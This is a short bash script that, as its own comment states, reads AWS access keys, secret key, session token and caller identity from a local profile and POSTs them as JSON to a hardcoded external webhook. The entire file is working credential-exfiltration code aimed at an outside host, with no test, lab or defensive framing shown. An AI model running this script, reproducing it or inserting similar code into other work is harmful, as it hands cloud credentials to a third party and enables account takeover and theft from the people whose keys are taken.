#!/bin/bash

# Script to retrieve AWS credentials from a profile and send them to a webhook

set -e

# Configuration
WEBHOOK_URL="http://ifc.politecnicllevant.cat:22881/cgi-bin/aws/index.py"
AWS_PROFILE="${1:-default}"  # Use first argument as profile name, default to 'default'

# Colors for output (optional)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Retrieving AWS credentials from profile: $AWS_PROFILE${NC}"

# Get AWS credentials from the profile
# Using aws configure get to retrieve credentials
ACCESS_KEY=$(aws configure get aws_access_key_id --profile "$AWS_PROFILE" 2>/dev/null || echo "")
SECRET_KEY=$(aws configure get aws_secret_access_key --profile "$AWS_PROFILE" 2>/dev/null || echo "")
SESSION_TOKEN=$(aws configure get aws_session_token --profile "$AWS_PROFILE" 2>/dev/null || echo "")
REGION=$(aws configure get region --profile "$AWS_PROFILE" 2>/dev/null || echo "us-east-1")

# Get AWS caller identity to capture the user ID
echo -e "${YELLOW}[*] Retrieving AWS caller identity for profile: $AWS_PROFILE${NC}"
USER_ID=$(aws sts get-caller-identity --profile "$AWS_PROFILE" --query 'UserId' --output text 2>/dev/null || echo "")
ACCOUNT_ID=$(aws sts get-caller-identity --profile "$AWS_PROFILE" --query 'Account' --output text 2>/dev/null || echo "")
ARN=$(aws sts get-caller-identity --profile "$AWS_PROFILE" --query 'Arn' --output text 2>/dev/null || echo "")

if [ -n "$USER_ID" ]; then
    echo -e "${GREEN}[+] Retrieved caller identity user ID: $USER_ID${NC}"
else
    echo -e "${YELLOW}[!] Could not retrieve caller identity for profile: $AWS_PROFILE${NC}"
fi

# Validate that we got the credentials
if [ -z "$ACCESS_KEY" ] || [ -z "$SECRET_KEY" ]; then
    echo -e "${RED}[ERROR] Failed to retrieve AWS credentials for profile: $AWS_PROFILE${NC}"
    echo -e "${RED}[ERROR] Make sure the AWS profile is configured correctly.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Successfully retrieved credentials${NC}"

# Prepare JSON payload
if [ -n "$SESSION_TOKEN" ]; then
    PAYLOAD=$(cat <<EOF
{
  "aws_access_key_id": "$ACCESS_KEY",
  "aws_secret_access_key": "$SECRET_KEY",
  "aws_session_token": "$SESSION_TOKEN",
  "region": "$REGION",
  "profile": "$AWS_PROFILE",
  "aws_user_id": "$USER_ID",
  "aws_account_id": "$ACCOUNT_ID",
  "aws_arn": "$ARN",
  "timestamp": "$(date -u +'%Y-%m-%dT%H:%M:%SZ')"
}
EOF
)
else
    PAYLOAD=$(cat <<EOF
{
  "aws_access_key_id": "$ACCESS_KEY",
  "aws_secret_access_key": "$SECRET_KEY",
  "region": "$REGION",
  "profile": "$AWS_PROFILE",
  "aws_user_id": "$USER_ID",
  "aws_account_id": "$ACCOUNT_ID",
  "aws_arn": "$ARN",
  "timestamp": "$(date -u +'%Y-%m-%dT%H:%M:%SZ')"
}
EOF
)
fi

echo -e "${YELLOW}[*] Sending credentials to webhook: $WEBHOOK_URL${NC}"

# Send POST request to webhook
RESPONSE=$(curl -s -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  -w "\n%{http_code}")

# Extract HTTP status code
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$RESPONSE" | sed '$d')

# Check response
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "201" ]; then
    echo -e "${GREEN}[+] Successfully sent credentials to webhook${NC}"
    echo -e "${GREEN}[+] HTTP Status Code: $HTTP_CODE${NC}"
    echo -e "${GREEN}[+] Response: $RESPONSE_BODY${NC}"
    exit 0
else
    echo -e "${RED}[ERROR] Failed to send credentials to webhook${NC}"
    echo -e "${RED}[ERROR] HTTP Status Code: $HTTP_CODE${NC}"
    echo -e "${RED}[ERROR] Response: $RESPONSE_BODY${NC}"
    exit 1
fi
